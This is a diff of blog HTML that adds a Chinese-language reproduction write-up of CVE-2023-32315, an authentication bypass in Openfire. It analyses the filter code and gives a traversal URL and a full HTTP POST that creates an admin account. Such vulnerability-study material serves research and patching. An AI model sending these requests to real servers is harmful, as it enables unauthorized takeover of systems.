@@ -156,6 +156,107 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-openfire权限绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2023-07-02T15:10:23.000Z" itemprop="datePublished">2023-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/">
+        openfire权限绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2023-32315"><a href="#CVE-2023-32315" class="headerlink" title="CVE-2023-32315"></a>CVE-2023-32315</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
+<li>影响版本：<code>3.10.0&lt;=Openfire&lt;4.6.8</code>，<code>4.7.0  &lt;=Openfire&lt;4.7.5</code></li>
+<li>搭建环境：<code>Ubuntu18.04</code>，<code>Openfire4.7.3</code>，其他默认内嵌配置<ul>
+<li>直接运行bin目录下的可执行文件<code>./openfire start</code>，就可以参照网上的文章进行初始化配置了</li>
+</ul>
+</li>
+</ol>
+<h2 id="定位filter"><a href="#定位filter" class="headerlink" title="定位filter"></a>定位filter</h2><ol>
+<li><p>下载源码，然后定位web.xml，鉴权的逻辑在<code>AuthCheckFilter</code></p>
+<img src="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image-20230615180212887.png" alt="image-20230615180212887" style="zoom:80%;">
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthCheck<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jivesoftware.admin.AuthCheckFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludes<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">            login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp</span><br><span class="line">        <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthCheck<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ol>
+<li><p>先diff一下<code>4.7.3</code>和无洞的<code>4.6.8</code>鉴权filter的区别：</p>
+<p><code>4.6.8</code>对传入的<code>url</code>进行Unicode解码，然后在进行处理</p>
+<p><img src="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/bbblog\source_posts\openfire权限绕过\image-20230615174900413.png" alt="image-20230615174900413"></p>
+</li>
+<li><p>分析<code>4.7.3</code>的鉴权逻辑：</p>
+<ol>
+<li>下面两个判断写死的，没有绕过的可能；</li>
+<li>第一个判断首先要找到exclude配置位置，上面定位的<code>&lt;init-param&gt;</code>中有，然后根据<code>exclude</code>判断是否有恶意的<code>..</code>存在，也就是目录穿越的恶意<code>url</code></li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">testURLPassesExclude</span><span class="params">(String url, String exclude)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (exclude.endsWith(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(exclude.substring(<span class="number">0</span>, exclude.length()-<span class="number">1</span>))) &#123;</span><br><span class="line">            <span class="comment">// Now make sure that there are no &quot;..&quot; characters in the rest of the URL.</span></span><br><span class="line">            <span class="keyword">if</span> (!url.contains(<span class="string">&quot;..&quot;</span>) &amp;&amp; !url.toLowerCase().contains(<span class="string">&quot;%2e&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (exclude.contains(<span class="string">&quot;?&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.equals(exclude)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">paramIndex</span> <span class="operator">=</span> url.indexOf(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (paramIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">            url = url.substring(<span class="number">0</span>, paramIndex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (url.equals(exclude)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>根据diff说明<code>url</code>在没有Unicode解码的时候，会有被绕过的风险，并且在web.xml的位置是第一个，说明会第一个执行，且前面没有进行过Unicode解码；然后根据第一个判断的结尾要是<code>*</code>，说明<code>exclude</code>选择的是<code>setup/setup-*</code>，构造<code>url</code>：（官方poc）</p>
+<p><code>log.jsp</code>不在<code>exclude</code>中且能被访问，就说明了存在权限绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.174:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image-20230615182215335.png" alt="image-20230615182215335" style="zoom:80%;"></li>
+</ol>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
+<li><p>创建Admin账户访问后台，poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /setup/setup-/%u002e%u002e/%u002e%u002e/user-create.jsp HTTP/1.1</span><br><span class="line">Cookie: JSESSIONID=node0143yydiecj99r16fbby9vv9lta4.node0; csrf=&#123;&#125;</span><br><span class="line">User-Agent: </span><br><span class="line">Accept: */*</span><br><span class="line">Host: </span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 144</span><br><span class="line"></span><br><span class="line">another=a&amp;create=a&amp;username=aizlm&amp;name=asdf&amp;email=&#123;&#125;&amp;password=aizlm&amp;passwordConfirm=aizlm&amp;isadmin=true&amp;csrf=&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image-20230615183112874.png" alt="image-20230615183112874" style="zoom:80%;">
+
+<img src="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image-20230615183051524.png" alt="image-20230615183051524" style="zoom: 67%;"></li>
+</ol>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xthnIAC580tnNaQeDgw6qg">https://mp.weixin.qq.com/s/xthnIAC580tnNaQeDgw6qg</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm">https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm</a></li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-CVE-2023-27350" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -187,14 +288,6 @@
       
         <h1 id="CVE-2023-27350"><a href="#CVE-2023-27350" class="headerlink" title="CVE-2023-27350"></a>CVE-2023-27350</h1><ul>
 <li><strong>未授权+RCE组合拳</strong></li>
-<li><strong>todo:</strong><ol>
-<li>本地jar和mozilla的特征记录，执行的语句写个demo（黑盒环境的配置，和白盒相关的代码）√</li>
-<li>系统起不来的情况下，静态怎么回溯到路由的入口函数</li>
-<li>反编译的是项目自写的jar，半自动化√</li>
-<li>了解ProcessBuilder</li>
-<li>RCE有第二种方式 PaperCut NG CVE-2023–27350</li>
-</ol>
-</li>
 </ul>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境：ubuntu18.04+papercut22.0.5.63914</p>
 <p>软件安装参考：<a target="_blank" rel="noopener" href="https://www.papercut.com/help/manuals/ng-mf/common/install-linux/">https://www.papercut.com/help/manuals/ng-mf/common/install-linux/</a></p>
